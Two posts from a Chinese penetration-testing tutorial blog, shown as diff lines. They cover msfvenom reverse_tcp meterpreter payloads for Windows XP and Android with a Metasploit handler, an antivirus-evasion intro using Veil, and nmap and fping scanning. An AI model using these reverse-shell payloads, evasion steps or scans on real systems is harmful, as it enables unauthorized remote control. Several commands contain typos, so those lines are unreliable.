-<li>按照远程控制软件被控端与主控端的连接方式：将远程控制软件分为正向和反向。(正向远程控制中，被控端只会在自己的主机上打开一个端口，然后等待主控端计算机的连接，所以使用这种方式主控端必须知道被控端的IP地址；但在反向远程控制中，主控端不需要知道被控端的IP地址，只需把这个远程控制程序发送给被控端即可)。</li>
-<li>按照目标操作系统的不同分类：比如在Windows平台下使用的远程控制程序对于Android操作系统是没有用的。</li>
-</ul>
-<h2 id="在kali中对WindosXP进行远程控制"><a href="#在kali中对WindosXP进行远程控制" class="headerlink" title="在kali中对WindosXP进行远程控制"></a>在kali中对WindosXP进行远程控制</h2><h3 id="在Kali中生成被控端"><a href="#在Kali中生成被控端" class="headerlink" title="在Kali中生成被控端"></a>在Kali中生成被控端</h3><p>生成被控端只需要考虑4点：</p>
-<ol>
-<li>选用哪个payload</li>
-<li>设置payload参数</li>
-<li>输出payload格式</li>
-<li>输出payload位置</li>
-</ol>
-<p>在kali中生成远程控制被控端程序，在kali终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.190.134 lport=5000 -f exe -o /root/payload.exe</span><br></pre></td></tr></table></figure>
-<ul>
-<li><font color="#fb8c00">-p</font> 指定要生成的payload(攻击载荷)，如果要使用自定义的payload，则使用<font color="#fb8c00">-</font>或<font color="#fb8c00">stdin</font>指定，上例中的<font color="#fb8c00">windows/meterpreter/reverse_tcp</font>是一个用于Windows平台下的反向远程控制程序。</li>
-<li><font color="#fb8c00">lhost</font> 指定接收被控端信息的主机(攻击载荷的参数之一)</li>
-<li><font color="#fb8c00">lport</font> 指定接收被控端信息的端口(攻击载荷的参数之一)</li>
-<li><font color="#fb8c00">-f</font> 指定输出的格式(可以使用-help–format来获得msf支持的输出格式列表)</li>
-<li><font color="#fb8c00">-o</font> 指定存储攻击载荷(payload)的路径<br>该命令执行后，会在参数<font color="#fb8c00">-o</font>后指定的路径中建立一个文件payload.exe，将该文件放入被控端主机中(WindowsXP系统)。</li>
-</ul>
-<blockquote>
-<p>注：上述lhost、lport都是攻击载荷的参数，攻击载荷不同，需要设置的参数也不同，可以使用 </p>
-</blockquote>
-<h3 id="在kali中启动主控端"><a href="#在kali中启动主控端" class="headerlink" title="在kali中启动主控端"></a>在kali中启动主控端</h3><p>在主控端主机(kali)中启动metasploit(请参阅渗透测试(5)):</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p>在Metasploit使用handler来作为主控端：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use exploit/multi/handler</span><br></pre></td></tr></table></figure>
-
-<p>对主控端进行设置：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; <span class="built_in">set</span> payload widnows/meterpreter/reverse_tcp   //设置攻击载荷</span><br><span class="line">msf&gt; <span class="built_in">set</span> lhost 192.168.190.135   //设置攻击载荷的参数</span><br><span class="line">msf&gt; <span class="built_in">set</span> lport 5000              //设置攻击载荷的参数</span><br></pre></td></tr></table></figure>
-<p>执行攻击：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; exploit</span><br></pre></td></tr></table></figure>
-<p>整体过程如下，出现最后一行表示攻击程序启动成功<br><img src="https://i.postimg.cc/k4qRbDT3/1.jpg" alt=""></p>
-<p>在被控端(windowsXP)打开payload.exe文件，然后会在主控端出现以下字样，表示已经成功取得被控端的控制权，在<font color="#fb8c00">meterpreter</font>后输入相关操作对被控端(WindowsXP)进行控制。<br><img src="https://i.postimg.cc/Ssd27qPX/2.png" alt=""></p>
-<h2 id="meterpreter在各种操作系统中的应用"><a href="#meterpreter在各种操作系统中的应用" class="headerlink" title="meterpreter在各种操作系统中的应用"></a>meterpreter在各种操作系统中的应用</h2><p>上述我们使用的被控端程序是基于Metasploit中提供的<font color="#fb8c00">windows/meterpreter/reverse_tcp</font>生成的。Metasploit分类下提供大量的被控端程序，后面介绍的payload也可以等同于被控端程序，，使用如下命令可以查看所有可使用的payload：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads</span><br></pre></td></tr></table></figure>
-<p>得到的结果如图所示：<br><img src="https://i.postimg.cc/brvGmWXm/3.jpg" alt=""><br><font color="#fb8c00">Name</font>为Payload的名称，<font color="#fb8c00">Description</font>是对漏洞的描述。</p>
-<ul>
-<li>所有payload模块的名字都使用三段式的标准，就是采用针对的操作系统+控制方式+模块具体名称组成，比如上例中的<font color="#fb8c00">windows/meterpreter/reverse_tcp</font></li>
-<li>payload提供的控制方式主要有<font color="#fb8c00">shell</font>和<font color="#fb8c00">meterpreter</font>等几种</li>
-<li>在最后面的模块名称中一般会表明是正向还是反向方式，以及采用哪一种网络协议进行传输。</li>
-</ul>
-<p>每个Payload在使用的时候都需要设置一些参数，可以使用选项<font color="#fb8c00">–payload-options</font>来查看这个payload需要设置的参数：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --payload-options</span><br></pre></td></tr></table></figure>
-
-<h3 id="meterpreter在安卓系统的应用"><a href="#meterpreter在安卓系统的应用" class="headerlink" title="meterpreter在安卓系统的应用"></a>meterpreter在安卓系统的应用</h3><p>测试用的手机应与kali计算机连在同一局域网内(kali虚拟机采用桥接模式)<br>在Kali平台下实施如下操作</p>
-<ol>
-<li>创建andriod平台下的远程控制程序:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.190.138 lport=5000 R&gt;/root/payload.apk</span><br></pre></td></tr></table></figure></li>
-</ol>
-<ul>
-<li><font color="#fb8c00">R&gt;</font> 因为msfvenom命令中默认没有apk这种可以直接在Android操作系统执行的文件格式，使用此参数可以保持文件原格式，就不必再使用<font color="#fb8c00">-f -o</font>指定输出格式和输出文件的位置。</li>
-<li>其他所有参数与攻击Windows操作系统下的命令含义相同。</li>
-</ul>
-<ol start="2">
-<li>在Metasploit中执行以下命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.190.138</span><br><span class="line"><span class="built_in">set</span> lport 5000</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li>
-<li>在手机上启动payload.apk程序，即可在kali上执行远程控制程序。</li>
-<li>连接成功过后使用<font color="#fb8c00">help</font>命令可以查看meterpreter在android系统中适用的指令</li>
-</ol>
-<h2 id="使用Veil-Evasion绕过杀毒软件"><a href="#使用Veil-Evasion绕过杀毒软件" class="headerlink" title="使用Veil-Evasion绕过杀毒软件"></a>使用Veil-Evasion绕过杀毒软件</h2><h3 id="安装veil-Evasion"><a href="#安装veil-Evasion" class="headerlink" title="安装veil-Evasion"></a>安装veil-Evasion</h3><p>kali并没有安装好Veil,在终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install evil-evasion</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://fightingtree.github.io/2019/11/17/penetrationTest4/" data-id="ck5ewyp06002xi8tw3jct668t" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-penetrationTest3" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/11/14/penetrationTest3/" class="article-date">
-  <time datetime="2019-11-14T03:21:07.000Z" itemprop="datePublished">2019-11-14</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/14/penetrationTest3/">渗透测试(3)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在执行侦察步骤(请参阅渗透测试(2))过后，我们建立了一个IP地址列表，该目标列表既是我们目标计算机的IP地址，也是我们被授权对其进行攻击的IP地址，在侦察中，我们建立了搜集到的信息与受攻击IP地址之间的映射关系，在扫描中，我们将建立IP地址与开放端口和服务的映射关系。</p>
-<p>大多数网络的职责就是至少允许某些信息穿越网络边界与外界进行沟通，完全孤立的网络，既没有与互联网连接，也没有提供像电子邮件或Web这样的服务。每一种服务，不管是直接或间接与外界连接，都会给攻击者提供潜在的立足点，我们将扫描过程分为以下四步：</p>
-<ol>
-<li>用<font color="#fb8c00">ping</font>数据包验证系统是否正在运行。</li>
-<li>用<font color="#fb8c00">Nmap</font>扫描系统端口</li>
-<li>用<font color="#fb8c00">Nmap脚本引擎(NSE)</font>进一步查询目标</li>
-<li>用<font color="#fb8c00">Nessus</font>扫描系统漏洞<br>有些扫描工具将这几个阶段合并成一个单一的过程</li>
-</ol>
-<ul>
-<li>1目的：判断目标系统是否已经开启以及是否可以与我们的计算机进行通信。无论这一步产生怎样的结果，我们都应进行下面的操作，</li>
-<li>2目的：识别在特定主机上开启了哪些端口以及运行了哪些服务(Nmap可将1.2合并为一步)</li>
-<li>3目的：利用NSE进一步查询，验证早期的发现</li>
-<li>4目的：定位和识别运行在目标计算机上的服务和软件有哪些已知漏洞</li>
-</ul>
-<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>端口提供了软件、服务、网络与硬件(包括电脑在内)进行通信的途径和场所，端口为计算机与计算机之间、计算机与软件之间、计算机与设备之间交换信息提供了一个数据连接。在计算机与网络互连之前，计算机之间通过物理介质进行通信，例如软盘，当计算机互连成网络后，它们之间就通过端口进行通信。使用多端口允许多个通信同时进行，无需等待。(把计算机想象成一所房子，人进入房子的方式有很多种，每一个进入房子(计算机)的通道就类似于计算机端口。所有通道就像计算机的端口一样，允许流量进出计算机。)</p>
-<p>很多常用的网络服务都运行在标准的端口号上，它提示攻击者目标系统开启了哪些功能。比如：</p>
-<ul>
-<li>port:80 HTTP</li>
-<li>port:443 HTTPS</li>
-</ul>
-<p>每一个端口都是进入目标系统的潜在通道，对于对外提供网络服务的服务器，我们必须利用的端口开放。(如HTTP端口80，FTP端口21等)</p>
-<h3 id="跳板攻击-Pivoting"><a href="#跳板攻击-Pivoting" class="headerlink" title="跳板攻击(Pivoting)"></a>跳板攻击(Pivoting)</h3><p>侵入一台机器，然后使用该机器作为跳板攻击另一台机器</p>
-<h3 id="扫描外部设备"><a href="#扫描外部设备" class="headerlink" title="扫描外部设备"></a>扫描外部设备</h3><p>不管我们是想进入到一个目标网络内还是想控制某些机密的内部机器，一般都要从扫描外部设备开始。先扫描外部设备是因为我们在侦察阶段所获得的信息大部分都是属于外部设备的，除此之外，我们不可能总有机会直接进入目标网络内，因此，我们通常使用跳板攻击，通过逐步控制一系列中间设备，并以它们为跳板，达到控制最终目标的目的。</p>
-<h4 id="外部设备"><a href="#外部设备" class="headerlink" title="外部设备"></a>外部设备</h4><p>外部设备包括计算机、服务器、路由器和防火墙以及其他设备，它们被部署在保护网络的边缘，这些设备是内部被保护资源和外部网络(如Internet)互相通信的中介。</p>
-<h2 id="Ping和Ping扫描"><a href="#Ping和Ping扫描" class="headerlink" title="Ping和Ping扫描"></a>Ping和Ping扫描</h2><p>ping是一种特定类型的网络数据包，称为ICMP数据包。ping用于给计算机或网络设备上的某些特殊接口发送特定类型的网络流量，这种特定类型的网络流量叫做ICMP回显数据包(ICMP Echo Request packets)。如收到ping包的设备(及其所附网卡)是开启的且不限制响应，那么它就会回应一个回显响应的数据包(Echo Reply packets)给发送方。ping包除了告诉我们某台主机是活动的并正在接收流量外，还提供数据包往返总时间、报告流量丢失情况、衡量一个网络连接的可靠性等。</p>
-<p>要在Linux上运行Ping命令，需要在终端发出如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping target_ip</span><br></pre></td></tr></table></figure>
-<p>比如，我们如果相对百度执行Ping命令，则在终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
-<p>得到的结果如下图所示：<br><img src="https://i.postimg.cc/cLCmvkrM/1.png" alt=""></p>
-<ul>
-<li>上图框中的一行告诉我们ICMP回显请求数据包成功到达了目标主机，并且该主机给我们的计算机发回了响应数据包。</li>
-<li><font color="#fb8c00">64 bytes</font>表明响应数据包的大小</li>
-<li><font color="#fb8c00">from 39.156.66.18(39.156.66.18)</font>指定了我们的<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的主机名及IP地址。</li>
-<li><font color="#fb8c00">icmp_seq=</font>指定数据包的顺序</li>
-<li><font color="#fb8c00">ttl=</font>是生存时间值，用来确定数据包自动终止前可以经历的最大跳数</li>
-<li><font color="#fb8c00">Time</font>告诉我们的数据包到目标往返一趟的时间</li>
-</ul>
-<h3 id="ping扫描"><a href="#ping扫描" class="headerlink" title="ping扫描"></a>ping扫描</h3><p>ping扫描就是自动发送一系列的ping包给指定范围内的IP地址，而不需要手动地逐个输入目标地址。</p>
-<p>执行Ping扫描最简单的方法是使用FPing工具，FPing已经内嵌于Kali中，以终端方式运行。可以在终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -a -g 39.156.66.14 39.156.66.18</span><br></pre></td></tr></table></figure>
-<ul>
-<li><font color="#fb8c00">-a</font> 表示在输出中只显示活动主机</li>
-<li><font color="#fb8c00">-g</font> 用于指定我们想要扫描的IP地址范围</li>
-</ul>
-<blockquote>
-<p>注：不是每个主机都会响应ping命令，有些主机上的防火墙或其他设施会抑制ping包</p>
-</blockquote>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul>
-<li>现在我们已经有了一个目标列表，我们可以针对其中的每一个探寻到的IP地址执行端口扫描。端口扫描的目的是为了识别在我们的目标系统上哪些端口是开启的，以及判断哪些服务是开启的。服务就是在计算机上执行的某个特定工作或任务，比如电子邮件服务、FTP服务、打印服务，或Web网页访问服务。端口扫描就如图敲一所房子的门和窗，看哪个会有回应。例如，如果我们发现80端口是开启的，我们可以尝试连接这个端口。这样就能不断地收集到监听在该端口的Web服务的相关信息。</li>
-<li>端口是基于TCP或UDP协议的，这取决于端口上运行的服务以及在端口上所运行的通信类型。</li>
-<li>当我们执行端口扫描时，我们的工具会创建数据包并将其发送给目标的每一个指定端口。这么做的目的是为了验证目标端口将给出什么样的响应，不同类型的端口扫描会显示不同的结果。</li>
-</ul>
-<h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>大多数新手都会认为黑客入侵是一种图形化的任务，但事实上，你的主要目标是获得一个有管理员权限的shell或进入目标电脑的后门。这个shell是一个字符形式的终端，它允许攻击者通过使用命令行来控制目标主机。</p>
-<h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>当某个网络上的两台计算机使用TCP进行通信时，它需要完成三次握手。这个过程与电话交谈类似。当你想通过电话和某人交谈时，你要先进行拨号，拨通后，对方在不知道你是谁的情况下说”喂？你好。”，这时你就可以说“嗨，我是张三。”对方知晓你的身份后，双方都有了足够的信息并可以开始正常交谈了。</p>
-<p>计算机的工作方式大致相同。当两台计算机想要对话时，第一台计算机通过发送一个SYN数据包给特定的端口号来连接第二台计算机，如果第二台计算机正在进行监听，它会发送一个SYN/ACK响应数据包作为响应。当第一台计算机收到SYN/ACK之后，由它再向第二台计算机回应一个ACK包，这时，两台计算机就可以正常运行了。在上述打电话的例子中，拨号相当于发送了SYN数据包，对方回应”喂？你好。”相当于返回一个SYN/ACK响应，最后你说“嗨，我是张三”则相当于返回了一个ACK响应数据包。</p>
-<h2 id="使用Nmap进行主动扫描"><a href="#使用Nmap进行主动扫描" class="headerlink" title="使用Nmap进行主动扫描"></a>使用Nmap进行主动扫描</h2><h3 id="Nmap的基本用法"><a href="#Nmap的基本用法" class="headerlink" title="Nmap的基本用法"></a>Nmap的基本用法</h3><h4 id="对单个主机的扫描"><a href="#对单个主机的扫描" class="headerlink" title="对单个主机的扫描"></a>对单个主机的扫描</h4><p>在终端输入如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp 192.168.190.134</span><br></pre></td></tr></table></figure>
-<p>上述指令对IP地址为192.168.190.134的主机进行扫描，结果如图所示：<br><img src="https://i.postimg.cc/XYPgdK5M/2.png" alt=""></p>
-<ul>
-<li>第一行给出Nmap的版本为7.80，扫描开始时间</li>
-<li>第二行给出一个标题</li>
-<li>第三行的<font color="#fb8c00">up</font>给出目标主机的状态，<font color="#fb8c00">up</font>意味着这台主机处于开机并连上互联网的状态</li>
-<li>第四行表示在进行检查的1000个端口中(默认)，有997个是关闭的</li>
-<li>接下来的字段，<font color="#fb8c00">PORT</font>指端口，<font color="#fb8c00">STATE</font>指状态，<font color="#fb8c00">SERVICE</font>指的是运行的服务。(此字段第一行表示目标计算机上的135号端口处于开放状态，这个端口提供msrpc服务)</li>
-<li>紧接着的一行给出目标主机的MAC地址</li>
-<li>最后一行表示经过对1台主机扫描，发现1台状态为up的主机，耗时1.4s</li>
-</ul>
-<p>对上述指令加一个参数<font color="#fb8c00">-sn</font>,其意义是扫描目标主机是否在线</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.190.134</span><br></pre></td></tr></table></figure>
-
-<h4 id="对多个不连续的主机进行扫描"><a href="#对多个不连续的主机进行扫描" class="headerlink" title="对多个不连续的主机进行扫描"></a>对多个不连续的主机进行扫描</h4><p>命令语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap IP1 IP2 IP3</span><br></pre></td></tr></table></figure>
-
-<h4 id="对多个连续主机进行扫描"><a href="#对多个连续主机进行扫描" class="headerlink" title="对多个连续主机进行扫描"></a>对多个连续主机进行扫描</h4><p>命令语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.190.134-255</span><br></pre></td></tr></table></figure>
-<h4 id="对整个子网进行扫描"><a href="#对整个子网进行扫描" class="headerlink" title="对整个子网进行扫描"></a>对整个子网进行扫描</h4><p>命令语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap IP地址/掩码位数</span><br><span class="line">nmap 192.168.190.134/24</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用Nmap进行主机发现"><a href="#使用Nmap进行主机发现" class="headerlink" title="使用Nmap进行主机发现"></a>使用Nmap进行主机发现</h3><h4 id="使用Nmap进行ARP连接扫描"><a href="#使用Nmap进行ARP连接扫描" class="headerlink" title="使用Nmap进行ARP连接扫描"></a>使用Nmap进行ARP连接扫描</h4><p>这种方式仅能用于与Nmap所在主机在同一子网的目标主机。当满足这个条件后，使用ARP扫描不仅速度快，而且结果最为精准，这是因为没有任何安全措施会阻止正常的ARP请求。<br>命令语法如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PR 192.168.190.134</span><br></pre></td></tr></table></figure>
-
-<h4 id="使用Nmap进行TCP连接扫描"><a href="#使用Nmap进行TCP连接扫描" class="headerlink" title="使用Nmap进行TCP连接扫描"></a>使用Nmap进行TCP连接扫描</h4><p>TCP连接扫描被认为是端口扫描中最基础最稳定的，因为Nmap试图在其命令指定的每个端口上完成三次握手。这种扫描完成后，又以友好的方式断开连接，因此很少有机会对目标系统进行洪泛攻击并导致崩溃。</p>
-<p>如果没有给出特定的端口扫描范围，Nmap将会扫描1000个最常用的端口。使用Nmap时，可以使用<font color="#fb8c00">-p-</font>参数指定扫描所有端口，建议使用<font color="#fb8c00">-Pn</font>参数，启用该参数将会导致Nmap禁用主机发现功能并假设每一个系统都是活动的，强行对其进行扫描。这对于发现在常规扫描中可能会漏掉的系统和端口非常有用</p>
-<p>为了运行TCP连接，我们在终端下执行以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p- -Pn 192.168.190.130</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><font color="#fb8c00">-sT</font> Nmap运行了一个TCP连接扫描，s告诉Nmap要运行哪种类型的扫描，-T用来执行一个TCP连接扫描</li>
-<li><font color="#fb8c00">-p-</font> 告诉Nmap要扫描所有端口，而不是只扫描默认的1000个常用端口</li>
-<li><font color="#fb8c00">-Pn</font> 跳过主机发现阶段，对所有地址进行扫描。</li>
-</ul>
-<p>通常，我们需要对整个子网或某一IP地址段进行扫描，在这种情况下，我们只需要将最后一个IP地址的最后一个字节添加到Nmap命令后面，就可以扫描一段连续范围内的IP地址：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p- -Pn 192.168.190.1-130</span><br></pre></td></tr></table></figure>
-<p>这条命令的执行会造成Nmap对IP地址为192.168.190.1到192.168.190.130范围内的所有主机进行端口扫描。</p>
-<h4 id="使用Nmap进行SYN扫描"><a href="#使用Nmap进行SYN扫描" class="headerlink" title="使用Nmap进行SYN扫描"></a>使用Nmap进行SYN扫描</h4><ul>
-<li>SYN扫描是Nmap扫描的默认扫描方式。SYN扫描比TCP连接扫描更快而且仍然相当安全，几乎不会造成拒绝服务攻击(DOS)或是目标系统瘫痪。SYN扫描并没有完成三次握手，只是完成了前两步，所以它的速度非常快。</li>
-<li>在SYN扫描中，执行扫描的主机发送SYN数据包给目标，目标回复SYN/ACK(假定端口已经启用且没有进行数据包过滤)，到目前为止，都与TCP连接扫描一样，但是接下来，执行扫描的计算机并没有向目标发送ACK数据包，而是发送了一个RST(重置)数据包给目标计算机。重置数据包告诉目标计算机放弃前面接收的所有包，并关闭两台计算机之间的连接。</li>
-<li>如果把三次握手看成一次打电话的过程，SYN扫描就像是一方呼叫另一方，接收方拿起电话说：“喂？”，这时发送方一声不吭的挂掉了电话。</li>
-</ul>
-<p>要运行SYN扫描，在终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- -Pn 192.168.190.130</span><br></pre></td></tr></table></figure>
-
-<h4 id="使用Nma进行UDP扫描"><a href="#使用Nma进行UDP扫描" class="headerlink" title="使用Nma进行UDP扫描"></a>使用Nma进行UDP扫描</h4><p>TCP连接扫描和SYN扫描都是基于TCP进行通信的。如果我们想要找寻基于UDP的服务，我们需要操控Nmap创建UDP数据包进行扫描，要进行UDP扫描，在终端输入以下命令即可：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 192.168.190.130</span><br></pre></td></tr></table></figure>
-<p>此命令没有<font color="#fb8c00">-p- -Pn</font>是因为UDP扫描非常慢，即使在默认的1000个端口执行一个基本的UDP扫描，也要花费很多时间。</p>
-<p>使用UDP进行通信不需要接收方做出响应，所以Nmap很难区分UDP端口是开启了还是扫描数据包被过滤了，所以，当Nmap执行<br>一个UDP扫描却没有收到任何响应信息时，它就会反馈给用户该端口“open|filtered(启用或过滤)”的信息，但在实际扫描中，几乎所有的端口都会被标记为”open|filtered”。</p>
-<h5 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h5><p>为了使目标返回对我们更加有用的信息，我们在UDP扫描中添加“-sV”参数，通过此参数用于版本扫描，但此处可用于缩小UDP扫描的范围。</p>
-<p>启用了版本扫描后，Nmap会发送额外的探测信息给每个扫描到的“open|filtered”端口。这个额外的探测信息试图发送额外的特制数据包来识别服务，这些特制数据包往往会成功触发目标进行响应。通常情况下，会将扫描报告中的结果从“open|filtered”改为”open”。使用版本扫描的命令如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sUV 129.168.190.130</span><br></pre></td></tr></table></figure>
-<h4 id="TCP和UDP"><a href="#TCP和UDP" class="headerlink" title="TCP和UDP"></a>TCP和UDP</h4><ul>
-<li>TCP是“面向连接的协议”，因为它需要通信双方保持同步，它确保发送方发出的数据包被接受方正确且按序接收。，TCP的工作机制类似于打电话。</li>
-<li>UDP是“无连接”的，因为它只需要发送方将数据包发送给接收者，并没有提供任何确认数据包是否到达目的地的机制。UDP的工作机制类似于往信箱里投一封信。大多数情况下，发送方只是在信封上写个地址。贴个邮票，并把信投进信箱，最后，配送员取走信件并开始配送，在这个过程中，发送方并不会收到回执或确认信息，一旦邮递员取走信件，发送方不能保证信件能够到达最终目的地。</li>
-</ul>
-<h3 id="使用Nmap进行端口发现"><a href="#使用Nmap进行端口发现" class="headerlink" title="使用Nmap进行端口发现"></a>使用Nmap进行端口发现</h3><p>Nmap对目标的端口进行扫描时，对端口状态的判断有以下5种：</p>
-<ul>
-<li><font color="#fb8c00">open</font> 应用程序在该端口接收TCP或UDP报文</li>
-<li><font color="#fb8c00">closed</font> 端口关闭</li>
-<li><font color="#fb8c00">filtered</font> 由于包过滤阻止探测报文到达端口，nmap无法确定端口是否开放。(过滤可能来自专业的防火墙设备，路由规则或主机上的软件防火墙)</li>
-<li><font color="#fb8c00">unfiltered</font> 此状态意味端口可被访问，但无法确定其是否开放。(只有映射防火墙规则集的ACK才会把端口分类到这个状态)</li>
-<li><font color="#fb8c00">open | filtered</font> 无法确定端口被过滤还是开放，开放的端口不响应就属于其中一种情况。</li>
-</ul>
-<h4 id="扫描全部端口"><a href="#扫描全部端口" class="headerlink" title="扫描全部端口"></a>扫描全部端口</h4><p>命令语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p <span class="string">"*"</span> 192.168.190.134</span><br></pre></td></tr></table></figure>
-<h4 id="扫描指定端口"><a href="#扫描指定端口" class="headerlink" title="扫描指定端口"></a>扫描指定端口</h4><p>命令语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 192.168.190.134</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用Nmap扫描目标主机的操作系统"><a href="#使用Nmap扫描目标主机的操作系统" class="headerlink" title="使用Nmap扫描目标主机的操作系统"></a>使用Nmap扫描目标主机的操作系统</h3><p>命令语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.190.134</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用Nmap扫描目标服务"><a href="#使用Nmap扫描目标服务" class="headerlink" title="使用Nmap扫描目标服务"></a>使用Nmap扫描目标服务</h3><p>通过添加<font color="#fb8c00">-sV</font>来进行服务和版本的识别。命令语法如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.190.134</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用Nmap执行Xmas扫描"><a href="#使用Nmap执行Xmas扫描" class="headerlink" title="使用Nmap执行Xmas扫描"></a>使用Nmap执行Xmas扫描</h3><h4 id="RFC文档"><a href="#RFC文档" class="headerlink" title="RFC文档"></a>RFC文档</h4><p>在计算机世界中，RFC要么是一个注释文档，要么是关于现有某项技术或标准的技术规格。RFC为我们提供了大量的特定系统内部运作的细节。攻击者会在其中查找文档所描述的系统的漏洞。Xmas Tree(圣诞树)扫描和Null(空)扫描正是利用了这样的漏洞进行攻击的。</p>
